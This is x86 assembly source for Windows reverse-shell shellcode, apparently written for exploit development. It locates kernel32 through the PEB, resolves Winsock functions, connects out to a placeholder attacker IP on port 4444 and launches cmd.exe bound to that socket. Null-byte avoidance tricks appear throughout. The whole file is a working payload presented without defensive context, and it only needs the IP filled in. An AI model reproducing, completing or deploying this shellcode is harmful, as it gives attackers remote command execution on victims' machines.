global _start

section .text
_start:


getkernel32:
	xor ecx, ecx                ; zeroing register ECX
	mul ecx                     ; zeroing register EAX EDX
	mov eax, [fs:ecx + 0x030]   ; PEB loaded in eax
	mov eax, [eax + 0x00c]      ; LDR loaded in eax
	mov esi, [eax + 0x014]      ; InMemoryOrderModuleList loaded in esi
	lodsd                       ; program.exe address loaded in eax (1st module)
	xchg esi, eax				
	lodsd                       ; ntdll.dll address loaded (2nd module)
	mov ebx, [eax + 0x10]       ; kernel32.dll address loaded in ebx (3rd module)

	; EBX = base of kernel32.dll address

getAddressofName:
	mov edx, [ebx + 0x3c]       ; load e_lfanew address in ebx
	add edx, ebx				
	mov edx, [edx + 0x78]       ; load data directory
	add edx, ebx
	mov esi, [edx + 0x20]       ; load "address of name"
	add esi, ebx
	xor ecx, ecx

	; ESI = RVAs

getProcAddress:
	inc ecx                             ; ordinals increment
	lodsd                               ; get "address of name" in eax
	add eax, ebx				
	cmp dword [eax], 0x50746547         ; GetP
	jnz getProcAddress
	cmp dword [eax + 0x4], 0x41636F72   ; rocA
	jnz getProcAddress
	cmp dword [eax + 0x8], 0x65726464   ; ddre
	jnz getProcAddress

getProcAddressFunc:
	mov esi, [edx + 0x24]       ; offset ordinals
	add esi, ebx                ; pointer to the name ordinals table
	mov cx, [esi + ecx * 2]     ; CX = Number of function
	dec ecx
	mov esi, [edx + 0x1c]       ; ESI = Offset address table
	add esi, ebx                ; we placed at the begin of AddressOfFunctions array
	mov edx, [esi + ecx * 4]    ; EDX = Pointer(offset)
	add edx, ebx                ; EDX = getProcAddress
	mov ebp, edx                ; save getProcAddress in EBP for future purpose

getLoadLibraryA:
	xor ecx, ecx                ; zeroing ecx
	push ecx                    ; push 0 on stack
	push 0x41797261             ; 
	push 0x7262694c             ;  AyrarbiLdaoL
	push 0x64616f4c             ;
	push esp
	push ebx                    ; kernel32.dll
	call edx                    ; call GetProcAddress and find LoadLibraryA address


getws2_32:
	push 0x61613233			        ; 23
	sub word [esp + 0x2], 0x6161    ; sub aa from aa23_2sw
	push 0x5f327377 		        ; _2sw
	push esp                        ; pointer to the string
	call eax 						; call Loadlibrary and find ws2_32.dll
	mov esi, eax                    ; save winsock handle for future puproses

 

getWSAStartup:
	push 0x61617075                  ; aapu
	sub word [esp + 0x2], 0x6161     ; sub aa from aapu
	push 0x74726174                  ; trat
	push 0x53415357                  ; SASW
	push esp	                     ; pointer to the string
	push esi	                     ; winsock handler
	call ebp                         ; GetProcAddress(ws2_32.dll, WSAStartup)

callWSAStartUp:
	xor edx, edx
	mov dx, 0x190          ; EAX = sizeof( struct WSAData )
	sub esp, edx           ; alloc some space for the WSAData structure
	push esp               ; push a pointer to this stuct
	push edx               ; push the wVersionRequested parameter
	call eax               ; call WSAStartup(MAKEWORD(2, 2), wsadata_pointer)

getWSASocketA:
	push 0x61614174                  ; 'aaAt'
	sub word [esp + 0x2], 0x6161          ; sub aa from aaAt
	push 0x656b636f                  ; 'ekco'
	push 0x53415357                  ; 'SASW'
	push esp                         ; pointer to the string
	push esi                         ; socket handler
	call ebp                         ; GetProcAddress(ws2_32.dll, WSASocketA)


callWSASocketA:
	xor edx, edx		            ; clear edx
	push edx;		                ; dwFlags=NULL
	push edx;		                ; g=NULL
	push edx;		                ; lpProtocolInfo=NULL
	mov dl, 0x6		                ; protocol=6
	push edx
	sub dl, 0x5      	            ; edx==1
	push edx		                ; type=1
	inc edx			                ; af=2
	push edx
	call eax		                ; call WSASocketA
	push eax		                ; save eax in edx
	pop edi			                ; 


getConnect:
	push 0x61746365                 ; atce
	sub word [esp + 0x3], 0x61      ; atce - a = tce
	push 0x6e6e6f63                 ; nnoc
	push esp	                    ; pointer to the string
	push esi	                    ; socket handler
	call ebp                        ; GetProcAddress(ws2_32.dll, connect)



callConnect:
	;set up sockaddr_in  
	mov edx, 0xhhhhhhhh	            ;the IP plus 0x01010101 so we avoid NULLs (IP=should be in the form of hh.hh.hh.hh) hh=hexadecimal value in reverseorder 
	sub edx, 0x01010101	            ;subtract from edx to obtain the real IP
	push edx                        ;push sin_addr
	push word 0x5c11              ;0x115c = (port 4444)
	xor edx, edx
	mov dl, 2
	push dx	
	mov edx, esp
	push byte 0x10
	push edx
	push edi
	call eax


getCreateProcessA:
	xor ecx, ecx 					; zeroing ECX
	push 0x61614173					; aaAs
	sub word [esp + 0x2], 0x6161 	; aaAs - aa
	push 0x7365636f 				; ecor
	push 0x72506574					; rPet
	push 0x61657243 				; aerC
	push esp 						; push the pointer to stack
	push ebx 						; kernel32 handler
	call ebp 						; GetProcAddress(kernel32.dll, CreateProcessA)
	mov esi, ebx                    ; save kernel32.dll handler for future purposes



shell:
	push 0x61646d63                 ; push admc
	sub word [esp + 0x3], 0x61      ; sub a to admc = dmc
	mov ebx, esp                    ; save a pointer to the command line
	push edi                        ; our socket becomes the shells hStdError
	push edi                        ; our socket becomes the shells hStdOutput
	push edi                        ; our socket becomes the shells hStdInput
	xor edi, edi                    ; Clear edi for all the NULL's we need to push
	push byte 0x12                  ; We want to place (18 * 4) = 72 null bytes onto the stack
	pop ecx                         ; Set ECX for the loop

push_loop:
	push edi                        ; push a null dword
	loop push_loop                  ; keep looping untill we have pushed enough nulls
	mov word [esp + 0x3C], 0x0101   ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
	mov byte [esp + 0x10], 0x44
	lea ecx, [esp + 0x10]  ; Set EAX as a pointer to our STARTUPINFO Structure

  	;perform the call to CreateProcessA
	push esp               ; Push the pointer to the PROCESS_INFORMATION Structure 
	push ecx               ; Push the pointer to the STARTUPINFO Structure
	push edi               ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
	push edi               ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
	push edi               ; We dont specify any dwCreationFlags 
	inc edi                ; Increment edi to be one
	push edi               ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
	dec edi                ; Decrement edi back down to zero
	push edi               ; Set lpThreadAttributes to NULL
	push edi               ; Set lpProcessAttributes to NULL
	push ebx               ; Set the lpCommandLine to point to "cmd",0
	push edi               ; Set lpApplicationName to NULL as we are using the command line param instead
	call eax

 

getExitProcess:
	add esp, 0x010 				; clean the stack
	push 0x61737365				; asse
	sub word [esp + 0x3], 0x61  ; asse -a 
	push 0x636F7250				; corP
	push 0x74697845				; tixE
	push esp
	push esi
	call ebp                    ; GetProcAddress(kernel32.dll, ExitProcess)

	xor ecx, ecx
	push ecx
	call eax